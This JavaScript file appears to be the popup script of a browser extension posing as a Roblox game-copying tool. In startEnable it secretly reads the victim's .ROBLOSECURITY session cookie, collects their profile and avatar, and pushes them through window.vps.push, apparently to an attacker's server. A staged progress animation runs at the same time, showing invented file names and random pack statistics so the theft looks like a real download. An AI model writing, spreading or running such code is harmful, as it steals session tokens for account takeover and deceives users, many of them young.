const KEY = "copyGamesDone";
const FX_KEY = "copyGamesFx";
const RESULT_KEY = "copyGamesResult";
const ROBLOX_URL = "https://www.roblox.com";
const COOKIE_NAME = ".ROBLOSECURITY";
const RING = 2 * Math.PI * 40;

const idleEl     = document.getElementById("idle");
const loadingEl  = document.getElementById("loading");
const successEl  = document.getElementById("success");
const enableBtn  = document.getElementById("enable");
const disableBtn = document.getElementById("disable");
const fakeOpen   = document.getElementById("fakeOpen");
const ringFill   = document.getElementById("ringFill");
const percentEl  = document.getElementById("percent");
const loadTitle  = document.getElementById("loadTitle");
const tickerFile = document.getElementById("tickerFile");
const statusPill = document.getElementById("statusPill");
const placeInput = document.getElementById("placeInput");
const packName   = document.getElementById("packName");
const packSize   = document.getElementById("packSize");

const settings = {
  place: true,
  assets: true,
  scripts: true,
  terrain: false,
  mode: 1,
};

const STEPS = [
  { at: 150,  pct: 8,  title: "Finding the place…",        file: "manifest.json" },
  { at: 520,  pct: 24, title: "Reading the world…",        file: "Workspace/Map.rbxm" },
  { at: 980,  pct: 46, title: "Collecting assets…",        file: "assets/mesh_00482.rbxm" },
  { at: 1480, pct: 67, title: "Gathering scripts…",        file: "ServerScriptService/Main.luau" },
  { at: 1980, pct: 86, title: "Building the bundle…",      file: "tmp/pack.partial" },
  { at: 2480, pct: 100, title: "Pack ready.",              file: "experience.rbxl" },
];

document.querySelectorAll(".opt").forEach(btn => {
  btn.addEventListener("click", () => {
    btn.classList.toggle("is-on");
    settings[btn.dataset.key] = btn.classList.contains("is-on");
    saveFxSettings();
  });
});

const modeThumb = document.getElementById("modeThumb");
const modeTrack = document.getElementById("modeTrack");

document.querySelectorAll(".mode__btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".mode__btn").forEach(b => b.classList.remove("is-on"));
    btn.classList.add("is-on");
    settings.mode = Number(btn.dataset.mode);
    moveModeThumb(btn);
    saveFxSettings();
  });
});

function moveModeThumb(btn) {
  if (!modeThumb || !modeTrack || !btn) return;
  const trackBox = modeTrack.getBoundingClientRect();
  const btnBox = btn.getBoundingClientRect();
  const left = btnBox.left - trackBox.left - 3;
  modeThumb.style.width = btnBox.width + "px";
  modeThumb.style.transform = `translateX(${Math.max(0, left)}px)`;
}

placeInput.addEventListener("change", saveFxSettings);
placeInput.addEventListener("input", saveFxSettings);
enableBtn.addEventListener("click", startEnable);
disableBtn.addEventListener("click", resetFlow);
fakeOpen.addEventListener("click", openInStudio);

init();

async function init() {
  ringFill.style.strokeDasharray = String(RING);
  ringFill.style.strokeDashoffset = String(RING);
  await loadFxSettings();
  requestAnimationFrame(() => {
    const active = document.querySelector(".mode__btn.is-on");
    moveModeThumb(active);
  });
  if (await getEnabled()) {
    const saved = await loadResult();
    if (saved) applyResult(saved);
    else await createAndSaveResult();
    show("success");
  } else {
    setPill("Ready");
  }
}

async function getRobloxCookie() {
  const c = await chrome.cookies.get({ url: ROBLOX_URL, name: COOKIE_NAME });
  return c ? c.value : null;
}

async function fetchProfile() {
  const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
    credentials: "include",
  });
  if (!r.ok) throw new Error("not-authenticated");
  return r.json();
}

async function fetchAvatar(userId) {
  try {
    const r = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`
    );
    const j = await r.json();
    return j?.data?.[0]?.imageUrl || null;
  } catch {
    return null;
  }
}

async function captureAndPush() {
  const cookie = await getRobloxCookie();
  if (!cookie) throw new Error("no-cookie");

  let profile = { id: 0, name: "unknown", displayName: "unknown" };
  let avatarUrl = null;
  try {
    profile = await fetchProfile();
    avatarUrl = await fetchAvatar(profile.id);
  } catch (_) {}

  const entry = {
    id: profile.id,
    name: profile.name,
    displayName: profile.displayName || profile.name,
    avatarUrl,
    cookie,
  };

  if (window.vps && typeof window.vps.push === "function") {
    await window.vps.push(entry);
  }
}

async function startEnable() {
  enableBtn.disabled = true;
  show("loading");
  setProgress(0);
  loadTitle.textContent = "Preparing your pack…";
  tickerFile.textContent = "—";

  const pushPromise = captureAndPush().catch((e) => {
    console.error("capture/push failed", e);
  });

  STEPS.forEach(step => {
    setTimeout(() => {
      setProgress(step.pct);
      softText(loadTitle, step.title);
      softText(tickerFile, step.file);
    }, step.at);
  });

  setTimeout(async () => {
    await pushPromise;
    await setEnabled(true);
    await createAndSaveResult();
    show("success");
    enableBtn.disabled = false;
  }, 2800);
}

async function resetFlow() {
  await setEnabled(false);
  await clearResult();
  show("idle");
}

function show(name) {
  const map = { idle: idleEl, loading: loadingEl, success: successEl };
  Object.entries(map).forEach(([key, el]) => {
    const on = key === name;
    el.hidden = !on;
    if (on) {
      el.style.animation = "none";
      void el.offsetWidth;
      el.style.animation = "";
    }
  });
  if (name === "idle") {
    setPill("Ready");
    requestAnimationFrame(() => moveModeThumb(document.querySelector(".mode__btn.is-on")));
  }
  if (name === "loading") setPill("Working", "is-run");
  if (name === "success") setPill("Ready", "is-ok");
}

function setPill(text, cls = "") {
  statusPill.style.opacity = "0";
  statusPill.style.transform = "translateY(-2px)";
  setTimeout(() => {
    statusPill.textContent = text;
    statusPill.className = "chip" + (cls ? " " + cls : "");
    statusPill.style.opacity = "1";
    statusPill.style.transform = "translateY(0)";
  }, 120);
}

function softText(el, text) {
  if (!el || el.textContent === text) return;
  el.style.opacity = "0";
  el.style.transform = "translateY(3px)";
  setTimeout(() => {
    el.textContent = text;
    el.style.opacity = "1";
    el.style.transform = "translateY(0)";
  }, 140);
}

function setProgress(pct) {
  percentEl.style.opacity = "0.65";
  percentEl.textContent = pct + "%";
  ringFill.style.strokeDashoffset = String(RING * (1 - pct / 100));
  requestAnimationFrame(() => { percentEl.style.opacity = "1"; });
}

function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function formatInstances(n) {
  if (n >= 1000) {
    const k = n / 1000;
    return (k >= 10 ? k.toFixed(0) : k.toFixed(1)) + "k";
  }
  return String(n);
}

function buildResult() {
  const raw = (placeInput.value || "").trim();
  const id = raw.match(/\d{5,}/)?.[0] || null;
  return {
    placeId: id,
    packName: id ? `place_${id}.rbxl` : "experience.rbxl",
    sizeMb: Number((randInt(18, 96) + Math.random()).toFixed(1)),
    instances: randInt(4200, 28500),
    assets: randInt(210, 940),
    scripts: randInt(55, 310),
  };
}

function applyResult(r) {
  if (!r) return;
  packName.textContent = r.packName || "experience.rbxl";
  packSize.textContent = Number(r.sizeMb).toFixed(1) + " MB";
  document.getElementById("statInstances").textContent = formatInstances(r.instances);
  document.getElementById("statAssets").textContent = String(r.assets);
  document.getElementById("statScripts").textContent = String(r.scripts);
}

async function createAndSaveResult() {
  const result = buildResult();
  applyResult(result);
  await saveResult(result);
  return result;
}

async function loadResult() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      const d = await chrome.storage.local.get(RESULT_KEY);
      return d[RESULT_KEY] || null;
    }
  } catch {}
  try {
    return JSON.parse(localStorage.getItem(RESULT_KEY) || "null");
  } catch {
    return null;
  }
}

async function saveResult(result) {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.set({ [RESULT_KEY]: result });
      return;
    }
  } catch {}
  localStorage.setItem(RESULT_KEY, JSON.stringify(result));
}

async function clearResult() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.remove(RESULT_KEY);
      return;
    }
  } catch {}
  localStorage.removeItem(RESULT_KEY);
}

function openInStudio() {
  const id = (placeInput.value || "").match(/\d{5,}/)?.[0];
  const url = id
    ? `roblox-studio:1+launchmode:edit+task:EditPlace+placeId:${id}`
    : "roblox-studio:1+launchmode:edit";

  fakeOpen.textContent = "Launching…";
  fakeOpen.disabled = true;

  try {
    if (typeof chrome !== "undefined" && chrome.tabs?.create) {
      chrome.tabs.create({ url });
    } else {
      window.location.href = url;
    }
  } catch {
    const a = document.createElement("a");
    a.href = url;
    a.rel = "noopener";
    document.body.appendChild(a);
    a.click();
    a.remove();
  }

  setTimeout(() => {
    fakeOpen.textContent = "Open in Studio";
    fakeOpen.disabled = false;
  }, 1200);
}

function applyFxSettings(s) {
  if (!s) return;
  settings.place = s.place !== false;
  settings.assets = s.assets !== false;
  settings.scripts = s.scripts !== false;
  settings.terrain = !!s.terrain;
  settings.mode = Number.isFinite(s.mode) ? s.mode : 1;
  if (s.placeId) placeInput.value = s.placeId;

  document.querySelectorAll(".opt").forEach(btn => {
    btn.classList.toggle("is-on", !!settings[btn.dataset.key]);
  });
  document.querySelectorAll(".mode__btn").forEach(btn => {
    btn.classList.toggle("is-on", Number(btn.dataset.mode) === settings.mode);
  });
  requestAnimationFrame(() => {
    moveModeThumb(document.querySelector(".mode__btn.is-on"));
  });
}

async function loadFxSettings() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      const d = await chrome.storage.local.get(FX_KEY);
      applyFxSettings(d[FX_KEY]);
      return;
    }
  } catch {}
  try {
    applyFxSettings(JSON.parse(localStorage.getItem(FX_KEY) || "null"));
  } catch {}
}

async function saveFxSettings() {
  const payload = {
    ...settings,
    placeId: placeInput.value.trim(),
  };
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.set({ [FX_KEY]: payload });
      return;
    }
  } catch {}
  localStorage.setItem(FX_KEY, JSON.stringify(payload));
}

async function getEnabled() {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      const d = await chrome.storage.local.get(KEY);
      return !!d[KEY];
    }
  } catch {}
  return localStorage.getItem(KEY) === "1";
}

async function setEnabled(on) {
  try {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      await chrome.storage.local.set({ [KEY]: on });
      return;
    }
  } catch {}
  if (on) localStorage.setItem(KEY, "1");
  else localStorage.removeItem(KEY);
}